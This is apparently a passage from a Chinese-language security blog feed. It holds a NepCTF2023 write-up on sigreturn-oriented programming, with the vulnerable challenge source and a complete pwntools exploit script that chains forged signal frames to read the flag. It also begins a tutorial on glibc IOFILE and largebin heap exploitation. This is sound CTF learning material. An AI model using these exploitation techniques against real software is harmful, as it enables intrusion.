‰∏çÁ¶ÅÊÑüÂà∞Ê±óÈ¢ú„ÄÇ</p><p>ÊúÄËøëÂíåÂ≠¶Èïø‰ª¨ËÅäÂ§©ÊØîËæÉÂ§öÔºåÂØπËá™Â∑±ÁöÑÊú™Êù•ÈÄêÊ∏ê‰πüÊúâ‰∫Ü‰∏Ä‰∫õËßÑÂàí„ÄÇÁõÆÂâç‰∏ªË¶ÅÁ≤æÂäõËøòÊòØ‰ºöÊîæÂú®‰∫åËøõÂà∂‰∏äÔºåÂπ∂ÂºÄÂßãÊ∂âË∂≥ÂØÜÁ†ÅÂ≠¶</p><p>ÊØïÁ´üÊòØÊñ∞Â≠¶ÊúüÔºåËøòÊòØÁ´ãÂá†‰∏™flagÂêßÔºà‰ªÄ‰πàÔºüÂì™ÈáåÊúâflagÔºüÊàëÁõ¥Êé•catÔºâ</p><ul><li><input disabled="" type="checkbox"> ÂÖªÊàêÂÜôÂçöÂÆ¢ËæìÂá∫Áü•ËØÜÁöÑ‰π†ÊÉØÔºåÂ∞ùËØïËã±ÊñáÂÜô‰Ωú</li><li><input disabled="" type="checkbox"> Â§öÂèÇÂä†ctfÔºå‰∏∞ÂØåÁªèÂéÜ</li><li><input disabled="" type="checkbox"> Â≠¶‰π†ÂÜÖÊ†∏ÊºèÊ¥ûÂà©Áî®</li><li><input disabled="" type="checkbox"> ‰∏çÁÜ¨Â§úÔºåÂ§öÈîªÁÇº</li></ul>]]></content>
    
    
    <summary type="html">Êë∏Êë∏</summary>
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
  </entry>
  
  <entry>
    <title>SROPÂàùËßÅÊùÄ-NepCTF2023</title>
    <link href="http://deepunk.icu/SROP/"/>
    <id>http://deepunk.icu/SROP/</id>
    <published>2023-08-12T12:45:49.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<p>ËøôÊ¨°ÊØîËµõÁ¨¨‰∏ÄÈ¢òÂ∞±ÊòØÂæàÊòéÊòæÁöÑ<strong>SROP</strong>ÔºåÊ≠£Â•ΩÂï•‰πü‰∏ç‰ºöÔºåÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ã</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p><strong>SROP</strong>ÂÖ®Áß∞‰∏∫<strong>Sigreturn Oriented Programming</strong>ÔºåÂÖ∂ÊîªÂáªÊ†∏ÂøÉ‰∏∫ÈÄöËøá‰º™ÈÄ†‰∏Ä‰∏™<strong>Signal Frame</strong>Ôºà‰ª•‰∏ãÁÆÄÁß∞<strong>sigFrame</strong>ÔºâÂú®Ê†à‰∏äÔºåÂêåÊó∂Ëß¶Âèë<strong>sigreturn</strong>Á≥ªÁªüË∞ÉÁî®ÔºåËÆ©ÂÜÖÊ†∏‰∏∫Êàë‰ª¨ÊÅ¢Â§ç‰∏Ä‰∏™sigFrameÊâÄÊèèËø∞ÁöÑËøõÁ®ãÔºåÂ¶Ç‰∏Ä‰∏™shell„ÄÅ‰∏Ä‰∏™wrtieÁ≥ªÁªüË∞ÉÁî®ÊâìÂç∞Ê†àÂú∞ÂùÄÁ≠âÔºåÂêåÊó∂ÈÄöËøáÂØπsigFrame‰∏≠rspÂíåripÁöÑ‰øÆÊîπÔºåËøûÊé•Â§ö‰∏™sigFrameÔºåÂèØÈÄöËøáÂ§öÊ¨°Ëß¶ÂèësigreturnÁ≥ªÁªüË∞ÉÁî®Ôºå‰æùÊ¨°ÊÅ¢Â§çÂ§ö‰∏™sigFrameÔºåÂÆûÁé∞‰∏çÂêåÁöÑÂäüËÉΩÔºåÊûÑÊàêSROPÊîªÂáª„ÄÇ‰∏Ä‰∏™sigFrameÂèØÁêÜËß£‰∏∫‰∏Ä‰∏™ËøõÁ®ãË¢´ÊåÇËµ∑Êó∂ÔºåÁî®‰∫é‰øùÂ≠òËøõÁ®ãÁöÑÊï∞ÊçÆÁªìÊûÑÔºåÂΩìËøõÁ®ãÊÅ¢Â§çÊó∂ÔºåÈÄöËøáËß¶ÂèësigreturnÊù•ÊÅ¢Â§çsigFrameÔºå‰ªéËÄåÊÅ¢Â§ç‰∏Ä‰∏™ËøõÁ®ã„ÄÇ</p><p>‰ª•‰∏äÂÜÖÂÆπÊòØÊäÑÁöÑÔºåËØ¥ÁôΩ‰∫ÜÂ∞±ÊòØÔºöËøõÁ®ãÂèóÂà∞‰∏Ä‰∏™signalËøõÂÖ•‰∏≠Êñ≠ÔºåÂÜÖÊ†∏‰ºö‰øùÂ≠ò‰∏ä‰∏ãÊñáÔºàÂØÑÂ≠òÂô®Áä∂ÊÄÅ‰πãÁ±ªÁöÑÔºåËøô‰∏™‰∏ä‰∏ãÊñáÂ≠òÂú®<strong>sigFrame</strong>‰∏≠ÔºâÔºåÈöèÂêéËøõÂÖ•Áî®Êà∑ÊÄÅÊâßË°åÂ§ÑÁêÜÂáΩÊï∞ÔºåÂ§ÑÁêÜÂÆåÊúÄÂêéÂèàËøõÂÖ•ÂÜÖÊ†∏ÊÄÅÊÅ¢Â§ç‰∏ä‰∏ãÊñá</p><p><img src="/../img/SROP.assets/image-20230812205434238.png" alt="image-20230812205434238"></p><p>ËÄåËøô‰∏™‰øùÂ≠ò‰∏ä‰∏ãÊñáÁöÑsigFrameÂÆåÂÖ®Âú®<strong>Áî®Êà∑Á©∫Èó¥</strong>ÔºåÂπ∂‰∏îÂÜÖÊ†∏ÂØπËøõÁ®ãÊåÇËµ∑Êó∂‰øùÂ≠òÁöÑsigFrame‰ª•ÂèäÊÅ¢Â§çÊó∂ËøòÂéüÁöÑsigFrame<strong>Ê≤°ÊúâÂÅö‰ªª‰ΩïÂÖ≥ËÅî</strong>ÔºåËøôÂØºËá¥sigFrameÂèØ‰ª•Ë¢´‰º™ÈÄ†</p><p><img src="/../img/SROP.assets/image-20230812205639153.png" alt="image-20230812205639153"></p><p>‰∏äÂõæÊòØ64‰ΩçÁöÑsigFrameÁªìÊûÑ„ÄÇÊÅ¢Â§ç‰∏ä‰∏ãÊñá‰πãÂâçÔºå‰ºöË∞ÉÁî®Â§ÑÁêÜÂáΩÊï∞<strong>Signal Handler</strong>ÔºåËØ•ÂáΩÊï∞ÊúÄÂêé‰∏Ä‰∏™Êåá‰ª§ÊòØ<code>ret</code>ÔºåÊ≠§Êó∂<code>rsp</code>Ê≠£Â•ΩÊåáÂêësigFrameÁöÑÊ†àÈ°∂Ôºå‰πüÂ∞±ÊòØÂ≠òÊúâÂáΩÊï∞<code>rt_sigreturn</code>Âú∞ÂùÄÁöÑ‰ΩçÁΩÆ„ÄÇÈöèÂêéË∞ÉÁî®<code>rt_sigreturn</code>ÔºåÈÄöËøáËØ•ÂáΩÊï∞ÂÆåÊàê‰∏ä‰∏ãÊñáÁöÑÊÅ¢Â§ç„ÄÇ</p><p>Âõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•Âú®<code>rsp</code>ÈôÑËøë‰º™ÈÄ†sigFrameÔºåÈÄöËøáË∞ÉÁî®<code>rt_sigreturn</code>ÂÆåÊàêÂØÑÂ≠òÂô®ÁöÑÂ∏ÉÁΩÆ</p><p>Ë∞ÉÁî®ÂèØ‰ª•Áõ¥Êé•ÂÜôÂÜÖÂ≠òÔºåÊõ¥Â∏∏ËßÅÁöÑÊòØËøõË°åË∞ÉÁî®Âè∑‰∏∫0xfÁöÑÁ≥ªÁªüË∞ÉÁî®</p><blockquote><p>Â∞èÊäÄÂ∑ßÔºöÁ≥ªÁªüË∞ÉÁî®Âè∑ÂèØ‰ª•ÈÄöËøá<code>cat /usr/include/asm/unistd_64.h</code>Êü•Áúã</p></blockquote><p>Âè¶Â§ñÔºåpwntools‰∏≠ÁöÑ<code>SigreturnFrame()</code>ÂèØ‰ª•Êñπ‰æøÂÆåÊàêÂØÑÂ≠òÂô®ÁöÑÂ∏ÉÁΩÆ</p><h1 id="Nepctf2023-SROP"><a href="#Nepctf2023-SROP" class="headerlink" title="Nepctf2023-SROP"></a>Nepctf2023-SROP</h1><p>Ê∫êÁ†ÅÈÉΩÂñÇÊàëÂò¥Èáå‰∫Ü</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x30</span>]=<span class="string">&quot;welcome to NepCTF2023!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sys</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="type">char</span> bd[<span class="number">0x30</span>];</span><br><span class="line">     seccomp();</span><br><span class="line">     syscall(<span class="number">1</span>,<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br><span class="line">     <span class="keyword">return</span> syscall(<span class="number">0</span>,<span class="number">0</span>,bd,<span class="number">0x300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊòæÁÑ∂ÈúÄË¶ÅÊâì‰∏Ä‰∏™orw</p><p>Ê≥®ÊÑèËøôÈáåÊúâ‰∏Ä‰∏™ÂùëÔºå‰ºóÊâÄÂë®Áü•Ôºå<code>syscall</code>ÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑ÊòØÈÄöËøá<code>rax</code>‰º†ÈÄíÔºåÁÑ∂ËÄåÊàë‰ª¨ÂèçÊ±áÁºñ‰πãÂêé</p><p><img src="/../img/SROP.assets/image-20230812211245122.png" alt="image-20230812211245122"></p><p>‰ª§‰∫∫ÊÑèÂ§ñÁöÑÊòØÔºåËøôÈáåÁöÑ<code>syscall</code>ÈÉΩÊòØÈÄöËøá<code>rdi</code>‰º†Ë∞ÉÁî®Âè∑ÁöÑÔºåÁåúÊµã‰∏éËøôÈáå‰ΩøÁî®<code>call syscall</code>ËÄåÈùûÁõ¥Êé•‰ΩøÁî®<code>syscall</code>ÊúâÂÖ≥</p><p>Êó¢ÁÑ∂‰∏çÁî®<code>rax</code>‰º†Ë∞ÉÁî®Âè∑ÔºåÈÇ£È¢òÁõÆ‰∏≠ÁöÑ<code>sys()</code>ÂáΩÊï∞‰πüÂ∞±Ê≤°ÊúâÊÑè‰πâ‰∫ÜÔºåÂ•ΩÂú®ËÉΩÊâæÂà∞<code>pop rdi</code>ÁöÑgadgetsÔºåÂèØ‰ª•‰ªªÊÑèÂ∏ÉÁΩÆ</p><p>ÊàëÁöÑÊÄùË∑ØÊòØÔºåÂÖàÊâì‰∏ÄÊ¨°sropÔºåÊääflagÂÜôÂà∞bssÊÆµÔºåÈ°∫‰æøÊääÊ†àËøÅÁßªËøáÂéªÔºåÈöèÂêéÊå®ÁùÄÊâìorw</p><p><strong>‰º™ÈÄ†sigFreame</strong>Êó∂ÈúÄË¶Å<strong>Ê†ºÂ§ñÊ≥®ÊÑè</strong></p><p><code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code>ÈúÄË¶Å<strong>‰øùÊåÅ‰∏çÂèò</strong>ÔºÅÂê¶Âàô‰ºöÊä•ÈîôÔºÅ</p><p>Êú¨‰∫∫Â∞±Âú®ËøôÈáåÊéíÊü•‰∫ÜÂæà‰πÖ</p><p>ÂèØ‰ª•ÊåâÁÖßÂ¶Ç‰∏ãÂÜôÊ≥ï</p><p><code>sig.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)</code></p><p>‰ªéÂ∑¶ÂæÄÂè≥‰æùÊ¨°‰∏∫<code>cs</code> <code>gs</code> <code>fs</code> <code>ss</code></p><p>expÂ¶Ç‰∏ã</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b *0x0000000004007AE\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;nepctf.1cepeak.cn&quot;</span></span><br><span class="line">port = <span class="number">30551</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line"></span><br><span class="line">sig = <span class="number">0x0000000000400750</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x00000000004007A8</span></span><br><span class="line">buf = <span class="number">0x0000000000601020</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span> +p64(pop_rdi)+p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">0</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x1000</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x10</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">2</span></span><br><span class="line">sig.rsi = buf</span><br><span class="line">sig.rdx = <span class="number">0</span></span><br><span class="line">sig.rcx = <span class="number">0</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x120</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x120</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x120</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x120</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">0</span></span><br><span class="line">sig.rsi = <span class="number">3</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x240</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(buf+<span class="number">0x240</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0xf</span>)</span><br><span class="line">sig = SigreturnFrame()</span><br><span class="line">sig.uc_flags = syscall</span><br><span class="line">sig.rax = <span class="number">0</span></span><br><span class="line">sig.rdi = <span class="number">1</span></span><br><span class="line">sig.rsi = <span class="number">1</span></span><br><span class="line">sig.rdx = buf</span><br><span class="line">sig.rcx = <span class="number">0x100</span></span><br><span class="line">sig.rip = syscall</span><br><span class="line">sig.rsp = buf+<span class="number">0x240</span></span><br><span class="line">sig.rbp = buf+<span class="number">0x240</span></span><br><span class="line">sig.csgsfs = (<span class="number">0x002b</span> * <span class="number">0x1000000000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x100000000</span>) | (<span class="number">0x0000</span> * <span class="number">0x10000</span>) | (<span class="number">0x0033</span> * <span class="number">0x1</span>)</span><br><span class="line">payload += <span class="built_in">str</span>(sig)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ËøôÊ¨°ÊØîËµõÁ¨¨‰∏ÄÈ¢òÂ∞±ÊòØÂæàÊòéÊòæÁöÑ&lt;strong&gt;SROP&lt;/strong&gt;ÔºåÊ≠£Â•ΩÂï•‰πü‰∏ç‰ºöÔºåÂ≠¶‰π†‰∫Ü‰∏Ä‰∏ã&lt;/p&gt;
&lt;h1 id=&quot;SROP&quot;&gt;&lt;a href=&quot;#SROP&quot; class=&quot;headerlink&quot; title=&quot;SROP&quot;&gt;&lt;/a&gt;SROP&lt;/h1&gt;&lt;p&gt;&lt;strong</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>IOFILE exploit</title>
    <link href="http://deepunk.icu/IOFILE-exploit/"/>
    <id>http://deepunk.icu/IOFILE-exploit/</id>
    <published>2023-08-11T08:02:03.000Z</published>
    <updated>2023-12-09T13:51:46.126Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Â∫è"><a href="#Â∫è" class="headerlink" title="Â∫è"></a>Â∫è</h1><p>ÂâçÊÆµÊó∂Èó¥Áªô‰∫∫ËÆ≤ËØæÔºåÁ¢∞‰∏ä‰∫ÜÈ´òÁâàÊú¨glibcÂ†ÜÂà©Áî®ËøôÈÉ®ÂàÜ„ÄÇÂàöÂ•ΩËá™Â∑±Âï•‰πü‰∏ç‰ºöÔºå‰∫éÊòØËä±‰∫Ü‰∫õÊó∂Èó¥Â•ΩÂ•ΩÂ≠¶‰∫Ü‰∏ãIOFILEÂú®È´òÁâàÊú¨‰∏ãÁöÑÂà©Áî®„ÄÇÂ•ΩÂú®ÊúÄÂêéÊ≤°ÊúâÁøªËΩ¶ÔºåËá™Â∑±Âú®Â§áËØæÊúüÈó¥‰πüÁã¨Á´ãÂÆåÊàê‰∫Ü‰∏Ä‰∫õÁªèÂÖ∏‰æãÈ¢òÔºåÁÆóÊòØÊúâ‰∫Ü‰∏Ä‰∫õÁ≤óÊµÖÁöÑÊî∂Ëé∑„ÄÇÁé∞‰ª•‰∏Ä‰∏™ÂàùÂ≠¶ËÄÖÁöÑÁõÆÂÖâÈáçÊñ∞Ê¢≥ÁêÜÂ≠¶‰π†IOFILEÂà©Áî®ÁöÑÊï¥‰∏™ËøáÁ®ã„ÄÇ</p><h1 id="ËæÖÂä©ÊâãÊ≥ï"><a href="#ËæÖÂä©ÊâãÊ≥ï" class="headerlink" title="ËæÖÂä©ÊâãÊ≥ï"></a>ËæÖÂä©ÊâãÊ≥ï</h1><p>IOFILEÁöÑÂà©Áî®ÔºåÈÄöÂ∏∏ÈúÄË¶Å‰º™ÈÄ†IOFILEÁªìÊûÑ‰ΩìÔºåÈöèÂêéÈÄöËøá‰∏Ä‰∫õÊñπÂºèËß¶ÂèëIOÊµÅÔºå‰ΩøÂæóÁ®ãÂ∫èË∞ÉÁî®Êàë‰ª¨Âä´ÊåÅÂêéÁöÑIOÂáΩÊï∞Ôºå‰ªéËÄåËææÊàêgetshellÊàñËÄÖorw„ÄÇÊâÄ‰ª•IOFILE exploitÂÆûÈôÖ‰∏äÊòØÊï¥‰∏™Âà©Áî®ÁéØËäÇÁöÑ<strong>ÊúÄÂêé‰∏ÄÊ≠•</strong>ÔºåË¶ÅËææÊàê‰º™ÈÄ†IOFILEÁªìÊûÑ‰Ωì„ÄÅËß¶ÂèëIOÈìæÔºåÂæÄÂæÄÈúÄË¶ÅÂÄüÂä©‰∏Ä‰∫õ<strong>ËæÖÂä©ÊâãÊ≥ï</strong>„ÄÇ</p><p>Âú®È´òÁâàÊú¨‰∏ãÔºåÊúÄ‰∏∫Â∏∏Áî®ÁöÑÊòØ<strong>largebin attack</strong>ÔºåËØ•ÊâãÊ≥ïÈúÄË¶Å‰∏Ä‰∏™UAFÔºåËææÊàêÂêéËÉΩÂú®‰ªªÊÑèÁõÆÊ†áÂú∞ÂùÄÂÜô‰∏äÂ†ÜÂú∞ÂùÄÔºåÁÆÄÂçïÊö¥ÂäõÔºåÁî®ËøáÈÉΩËØ¥Â•Ω„ÄÇËøòÊúâ<strong>tcache poisoning</strong>ÔºåÁî®Êù•ÂàÜÈÖçÂà∞‰ªªÊÑèÂú∞ÂùÄ‰∏ä„ÄÇËøòÊúâ‰∏ÄÁßçÊòØ<strong>tcache stashing unlink</strong>ÔºåËØ•ÊâãÊ≥ïÂú®house of pig‰∏≠Ë¢´‰ΩøÁî®ÔºåË¶ÅÊ±ÇÁ®ãÂ∫è‰ΩøÁî®callocÔºåÂπ∂Â≠òÂú®UAFÔºåÈÄöÂ∏∏ÁªìÂêàlargebin attackËææÊàêÂ∞ÜÁõÆÊ†áÂú∞ÂùÄÂàÜÈÖç‰∏∫chunk„ÄÇ</p><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>ÂéüÂÖàÂ≠òÂú®‰∏§Êù°Âà©Áî®ÈìæÔºåÂÖ∂‰∏≠‰∏ÄÊù°Âú®È´òÁâàÊú¨‰∏ãÂ∑≤Ë¢´Â∞ÅÁ¶ÅÔºåÊü•ÊâæËµÑÊñôÊó∂ÈúÄÁîÑÂà´„ÄÇ</p></blockquote><p>È¶ñÂÖàÊàë‰ª¨ÈúÄË¶Å‰∫ÜËß£largebinÁöÑÁªìÊûÑÔºö</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811162248700.png" alt="image-20230811162248700"></p><p>‰∏Ä‰∏™large bin‰∏≠ÂåÖÂê´<strong>‰∏ÄÂÆöËåÉÂõ¥Â§ßÂ∞è</strong>ÁöÑlarge chunkÔºåÂ¶ÇÁ¨¨‰∏Ä‰∏™largebinÂ§ßÂ∞èËåÉÂõ¥‰∏∫(0x400-0x430)ÔºåÁ¨¨‰∫å‰∏™‰∏∫(0x440-0x470)„ÄÇÂêå‰∏Ä‰∏™bin‰∏≠ÔºåÁõ∏ÂêåÂ§ßÂ∞èÁöÑchunk‰πãÈó¥Áî®<code>fd</code>„ÄÅ<code>bk</code>Áõ∏ËøûÔºå‰∏çÂêåÂ§ßÂ∞èÁî®<code>fd_nextsize</code>„ÄÅ<code>bk_nextsize</code>Áõ∏ËøûÔºå‰∏îËá™Âä®Áî±Â§ßÂà∞Â∞èÊéíÂ∫èÔºåÂ¶Ç‰∏äÂõæ‰∏≠Â∑¶ËæπÁöÑÂ§ß‰∫éÂè≥Ëæπ„ÄÇ</p><p>ÂΩìÊúâÊñ∞ÁöÑchunkÂä†ÂÖ•largebinÔºå‰∏îÂ§ßÂ∞èÂ∞è‰∫éËØ•bin‰∏≠Â∑≤ÊúâÁöÑchunkÊó∂Ôºå‰ºöËøõË°åÂ¶Ç‰∏ãÊìç‰ΩúÔºàÁ≤æÁÆÄÁâàÔºâÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line"><span class="comment">/*Êü•ÊâæËØ•sizeÂ±û‰∫éÁöÑbinËåÉÂõ¥ÔºåËøîÂõûindex*/</span></span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line"><span class="comment">/*ÂèñÂæóbin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br><span 